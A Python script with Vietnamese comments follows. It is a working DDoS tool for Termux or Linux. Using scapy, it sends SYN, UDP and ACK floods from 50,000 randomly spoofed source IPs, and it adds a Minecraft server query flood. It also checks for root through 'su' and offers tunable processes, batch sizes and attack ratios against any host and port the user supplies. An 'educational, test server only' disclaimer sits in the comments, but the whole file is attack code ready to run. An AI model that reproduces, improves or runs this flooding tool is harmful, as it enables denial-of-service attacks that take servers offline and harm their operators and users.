#!/usr/bin/env python3
import sys
import os
import psutil
import multiprocessing
import random
import time
import argparse
import logging
import json
from datetime import datetime
import signal
from concurrent.futures import ThreadPoolExecutor
from functools import partial
try:
    from scapy.all import IP, TCP, UDP, send
except ImportError:
    print("Scapy không được cài đặt. Chạy 'pkg install python; pip install scapy' trên Termux.")
    sys.exit(1)
try:
    from mcstatus import JavaServer
except ImportError:
    JavaServer = None

# Script DDoS (SYN, UDP, ACK, Query Flood) tối ưu cho Termux/Linux (giáo dục)
# Chỉ chạy trên server thử nghiệm của bạn!
# Hỗ trợ không root (chỉ Query Flood) và root (toàn bộ tấn công)
# Cách dùng: python3 ddos_pro.py --host <IP> --port <PORT> --processes <QUY_TRÌNH> --duration <GIÂY> [--log <FILE>] [--attack-ratio <SYN:UDP:ACK:QUERY>] [--batch-size <SỐ>] [--delay <GIÂY>] [--retry-count <SỐ>] [--max-cpu <PHẦN_TRĂM>] [--config <FILE>]
# Ví dụ: python3 ddos_pro.py --host 127.0.0.1 --port 25565 --processes 2 --duration 30 --log ddos.log --attack-ratio 0:0:0:100

class PacketGenerator:
    """Tạo gói tin cho các loại tấn công"""
    def __init__(self, target_ip, target_port, fake_ips):
        self.target_ip = target_ip
        self.target_port = target_port
        self.fake_ips = list(fake_ips)

    def generate(self, attack_type):
        """Tạo gói tin dựa trên loại tấn công"""
        try:
            src_ip = random.choice(self.fake_ips)
            src_port = random.randint(1024, 65535)
            if attack_type == "syn":
                return IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(1000, 9000000))
            elif attack_type == "udp":
                return IP(src=src_ip, dst=self.target_ip)/UDP(sport=src_port, dport=self.target_port)
            elif attack_type == "ack":
                return IP(src=src_ip, dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="A", seq=random.randint(1000, 9000000), ack=random.randint(1000, 9000000))
            return None
        except Exception as e:
            logging.error(f"Lỗi tạo gói {attack_type}: {e}")
            return None

class AttackManager:
    """Quản lý các cuộc tấn công DDoS"""
    def __init__(self, target_ip, target_port, processes, duration, attack_ratio, batch_size, delay, retry_count, max_cpu, is_root):
        self.target_ip = target_ip
        self.target_port = target_port
        self.processes = min(processes, psutil.cpu_count(), 4)  # Giới hạn cho Termux
        self.duration = duration
        self.batch_size = max(10, min(batch_size, 500))  # Giới hạn cho Termux
        self.delay = max(0, min(delay, 1.0))
        self.retry_count = max(1, min(retry_count, 5))
        self.max_cpu = max(50, min(max_cpu, 95))
        self.is_root = is_root
        self.packet_count = multiprocessing.Value('i', 0)
        self.query_count = multiprocessing.Value('i', 0)
        self.fake_ips = {f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(50000)}  # 50K IP giả
        self.packet_generator = PacketGenerator(target_ip, target_port, self.fake_ips)

        # Phân tích tỷ lệ tấn công
        try:
            ratios = [float(x) for x in attack_ratio.split(":")]
            if len(ratios) != 4 or sum(ratios) != 100:
                raise ValueError
            self.syn_ratio, self.udp_ratio, self.ack_ratio, self.query_ratio = [r/100 for r in ratios]
        except ValueError:
            raise ValueError("Tỷ lệ tấn công phải có dạng SYN:UDP:ACK:QUERY, tổng=100 (ví dụ: 0:0:0:100)")

        # Nếu không root, chỉ cho phép Query Flood
        if not self.is_root and (self.syn_ratio + self.udp_ratio + self.ack_ratio > 0):
            logging.warning("Không có quyền root, chuyển sang Query Flood")
            self.syn_ratio = self.udp_ratio = self.ack_ratio = 0
            self.query_ratio = 1.0

        # Kiểm tra mcstatus
        if not JavaServer and self.query_ratio > 0:
            logging.error("mcstatus không khả dụng, không thể chạy Query Flood. Cài bằng 'pip install mcstatus'.")
            sys.exit(1)

    def query_flood(self):
        """Gửi yêu cầu Query (L7)"""
        try:
            server = JavaServer(self.target_ip, self.target_port)
            server.status(timeout=1)
            with self.query_count.get_lock():
                self.query_count.value += 1
        except Exception as e:
            logging.debug(f"Lỗi Query Flood: {e}")

    def attack_worker(self, stop_event):
        """Worker gửi gói và query"""
        try:
            while not stop_event.is_set():
                if psutil.cpu_percent() > self.max_cpu:
                    logging.warning("CPU vượt ngưỡng, giảm tải...")
                    time.sleep(0.1)
                    continue

                if self.query_ratio == 1.0:  # Chỉ Query Flood
                    with ThreadPoolExecutor(max_workers=5) as executor:
                        executor.submit(self.query_flood)
                else:
                    packets = []
                    for _ in range(self.batch_size):
                        r = random.random()
                        if r < self.syn_ratio:
                            packet = self.packet_generator.generate("syn")
                        elif r < self.syn_ratio + self.udp_ratio:
                            packet = self.packet_generator.generate("udp")
                        elif r < self.syn_ratio + self.udp_ratio + self.ack_ratio:
                            packet = self.packet_generator.generate("ack")
                        else:
                            self.query_flood()
                            continue
                        if packet:
                            packets.append(packet)

                    if packets:
                        for _ in range(self.retry_count):
                            try:
                                send(packets, verbose=0, inter=0)
                                with self.packet_count.get_lock():
                                    self.packet_count.value += len(packets)
                                break
                            except Exception as e:
                                logging.error(f"Lỗi gửi gói, thử lại: {e}")
                                time.sleep(0.1)

                if self.delay > 0:
                    time.sleep(self.delay)
        except MemoryError:
            logging.error("Hết bộ nhớ! Giảm --batch-size hoặc --processes.")
        except Exception as e:
            logging.error(f"Lỗi worker: {e}")

    def stats_collector(self, stop_event):
        """Thu thập và log thống kê"""
        start_time = time.time()
        while not stop_event.is_set():
            try:
                time.sleep(1)
                with self.packet_count.get_lock(), self.query_count.get_lock():
                    elapsed = time.time() - start_time
                    packet_rate = self.packet_count.value / elapsed if elapsed > 0 else 0
                    query_rate = self.query_count.value / elapsed if elapsed > 0 else 0
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent
                    logging.info(f"Gói: {self.packet_count.value:,} | Tốc độ: {packet_rate:,.0f} gói/giây | Query: {self.query_count.value:,} | Tốc độ: {query_rate:,.0f} query/giây | CPU: {cpu_usage:.1f}% | RAM: {ram_usage:.1f}% | Thời gian: {elapsed:.1f}s")
            except Exception as e:
                logging.error(f"Lỗi thống kê: {e}")

    def run(self):
        """Chạy DDoS"""
        logging.info(f"Bắt đầu DDoS đến {self.target_ip}:{self.target_port}")
        logging.info(f"Số quy trình: {self.processes} | Thời gian: {self.duration}s | Batch size: {self.batch_size} | Delay: {self.delay}s | Retry: {self.retry_count}")
        logging.info(f"Tỷ lệ tấn công: SYN={self.syn_ratio*100:.0f}% UDP={self.udp_ratio*100:.0f}% ACK={self.ack_ratio*100:.0f}% Query={self.query_ratio*100:.0f}%")
        
        manager = multiprocessing.Manager()
        stop_event = manager.Event()
        
        stats = multiprocessing.Process(target=self.stats_collector, args=(stop_event,))
        stats.daemon = True
        stats.start()
        
        with multiprocessing.Pool(processes=self.processes) as pool:
            pool.map(partial(self.attack_worker, stop_event), range(self.processes))
            try:
                time.sleep(self.duration)
            except KeyboardInterrupt:
                logging.warning("Người dùng dừng chương trình...")
            
            stop_event.set()
            pool.terminate()
            pool.join()
        
        stats.join(timeout=5)
        
        with self.packet_count.get_lock(), self.query_count.get_lock():
            logging.info(f"Kết thúc! Tổng gói: {self.packet_count.value:,} | Tổng Query: {self.query_count.value:,}")

def check_requirements():
    """Kiểm tra yêu cầu hệ thống"""
    is_root = False
    try:
        is_root = os.geteuid() == 0
    except Exception:
        pass

    if not is_root:
        try:
            # Thử chạy lệnh su
            result = os.system("su -c 'whoami' > /dev/null 2>&1")
            is_root = result == 0
        except Exception:
            logging.warning("Không tìm thấy binary 'su'. Cài 'tsu' bằng 'pkg install tsu' hoặc root thiết bị bằng Magisk.")

    if not is_root:
        logging.warning("Thiết bị không root. Chỉ chạy Query Flood (--attack-ratio 0:0:0:100). Để chạy SYN/UDP/ACK, root thiết bị bằng Magisk và cài 'tsu'.")

    ram = psutil.virtual_memory().total / (1024**3)
    if ram < 0.5:
        logging.warning("RAM thấp (<0.5GB). Có thể gây crash.")
    if psutil.cpu_count() < 2:
        logging.warning("CPU yếu (<2 core). Hiệu suất sẽ thấp.")

    return is_root

def load_config(config_file):
    """Tải cấu hình từ file JSON"""
    default_config = {
        "attack_ratio": "0:0:0:100",
        "batch_size": 100,
        "delay": 0.01,
        "retry_count": 3,
        "max_cpu": 85,
        "processes": 2
    }
    if config_file and os.path.exists(config_file):
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
            default_config.update(config)
        except Exception as e:
            logging.error(f"Lỗi tải config: {e}")
    return default_config

def signal_handler(sig, frame):
    """Xử lý tín hiệu Ctrl+C"""
    logging.info("Đang dừng chương trình...")
    sys.exit(0)

def main():
    """Hàm chính"""
    signal.signal(signal.SIGINT, signal_handler)
    
    parser = argparse.ArgumentParser(
        description="DDoS (SYN, UDP, ACK, Query Flood) tối ưu cho Termux/Linux (giáo dục). Chỉ chạy trên server thử nghiệm!",
        epilog="Ví dụ: python3 ddos_termux.py --host 127.0.0.1 --port 25565 --processes 2 --duration 30 --log ddos.log --attack-ratio 0:0:0:100"
    )
    parser.add_argument("--host", required=True, help="IP server đích")
    parser.add_argument("--port", type=int, required=True, help="Cổng đích")
    parser.add_argument("--processes", type=int, default=2, help="Số quy trình (mặc định: 2)")
    parser.add_argument("--duration", type=int, default=30, help="Thời gian (giây, mặc định: 30)")
    parser.add_argument("--log", help="File log")
    parser.add_argument("--attack-ratio", default="0:0:0:100", help="Tỷ lệ tấn công SYN:UDP:ACK:QUERY, tổng=100 (mặc định: 0:0:0:100)")
    parser.add_argument("--batch-size", type=int, default=100, help="Số gói mỗi lần gửi")
    parser.add_argument("--delay", type=float, default=0.01, help="Độ trễ giữa các đợt gửi (giây)")
    parser.add_argument("--retry-count", type=int, default=3, help="Số lần thử lại nếu lỗi gửi")
    parser.add_argument("--max-cpu", type=int, default=85, help="Giới hạn CPU (%)")
    parser.add_argument("--config", help="File cấu hình JSON")
    
    args = parser.parse_args()
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler(args.log) if args.log else logging.NullHandler()
        ]
    )
    
    is_root = check_requirements()
    config = load_config(args.config)
    
    try:
        attack = AttackManager(
            target_ip=args.host,
            target_port=args.port,
            processes=args.processes or config["processes"],
            duration=args.duration,
            attack_ratio=args.attack_ratio or config["attack_ratio"],
            batch_size=args.batch_size or config["batch_size"],
            delay=args.delay or config["delay"],
            retry_count=args.retry_count or config["retry_count"],
            max_cpu=args.max_cpu or config["max_cpu"],
            is_root=is_root
        )
        attack.run()
    except Exception as e:
        logging.error(f"Lỗi khởi động: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()